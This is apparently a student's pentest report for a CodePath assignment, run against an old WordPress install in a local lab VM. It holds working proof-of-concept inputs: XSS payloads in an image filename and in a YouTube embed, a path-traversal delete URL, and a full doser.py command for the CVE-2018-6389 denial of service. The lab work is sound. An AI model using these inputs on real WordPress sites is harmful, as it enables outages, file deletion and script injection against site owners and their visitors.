# Week7-WP
This a repository to pentest WordPress for CodePath assignment.

(Optional)Vulnerability Name:WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename

Summary: this is a cross site scripting vulnerability that allows the attacker to create a malicious java script code and 
insert it as the name of an image file, if the image is uploaded the inserted filename(jscode) will be injected in WordPress
       
       Vulnerability types:XSS Cross-Site Scripting
       
       Tested in version:4.2.2
       
       Fixed in version: 4.2.10
       
       GIF Walkthrough:
![xssviamimage](https://user-images.githubusercontent.com/30760006/37509403-7841c352-28b4-11e8-85b1-cc93d7584dbc.gif)
Steps to recreate: rename an image with a js code like (angryTuk"><img src=x onerror=prompt(document.domain)>) as a filename, the code will be injected as soon as the admin/user upload it through page attachement.

Affected source code: media.php.

## Pentesting Report

1. (Required) Vulnerability Name:WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds

  - [ ] Summary: allows users with posting priveleges to insert JavaScript malicious code for users/admin browsers to run.
    
    - Vulnerability types:(xss)CrossSite Scripting
    
    - Tested in version:4.0
    
    - Fixed in version: 4.7.3
  
  - [ ] GIF Walkthrough: 
  
  ![youtubexss](https://user-images.githubusercontent.com/30760006/37540430-1d14a07a-2914-11e8-8a3a-371cb2e1c98b.gif)

  
  - [ ] Steps to recreate: a user with posting abitlity, post the JS code ([embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]) in a new post, and anyone who opens the post for view the code will be triggered.
  
  - [ ] Affected source code:embed.php




1. (Required) Vulnerability Name:  WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched) CVE-2018-6389

- [ ] Summary: using the linux command line to launch a denial of service against the WordPress application.
    
    - Vulnerability types:DoS Denial of Service
    
    - Tested in version:4.9.1
   
   - Fixed in version: unpatched
  
  - [ ] GIF Walkthrough:
  ![dos](https://user-images.githubusercontent.com/30760006/37552263-bd059a30-296e-11e8-8f7e-2eae5ab23678.gif)
   [ ] GIF Walkthrough:(continued)
   ![dos2](https://user-images.githubusercontent.com/30760006/37552354-9f885018-2970-11e8-9d2a-ad31fdec97aa.gif)

  
  - [ ] Steps to recreate: Download the python script doser.py point the script to wpdistillery.vm and then use linux command line to launch the attack using the given script.
 
 - [ ] Affected source code:script-loader.php
 
 1. (required) Vulnerability Name:WordPress 3.x-4.x Path Traversal + Directory Listing + File Deletion Vulnerabilities/ Denial of Service
  
  - [ ] Summary: any user with access to plugins can perform a Path Traversal and therefor a DoS if those files are deleted
    
    - Vulnerability types: Path Traversal / DoS
    
    - Tested in version:3.7
    
    - Fixed in version: 4.3
  
  - [ ] GIF Walkthrough: 
  ![path](https://user-images.githubusercontent.com/30760006/37552976-2eba56b8-297c-11e8-838e-6b62a766e0f3.gif)
  
  - [ ] Steps to recreate: go to plugins click on the delete button Akismet plugin in the url (http://wpdistillery.vm/wp-admin/plugins.php?action=delete-selected&checked%5B0%5D=akismet%2Fakismet.php&plugin_status=all&paged=1&s&_wpnonce=d15b1ace35) change the name of the plugin with (../../../../), then click on the link that says click to view entire lise this will take you to higher diractories which can be deleted in the same process.
  
  - [ ] Affected source code:plugins.php
  

## Assets

Deniel of Servise script

python doser.py -g'http://wpdistillery.vm/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 9999

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with Peek https://github.com/phw/peek.git

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    
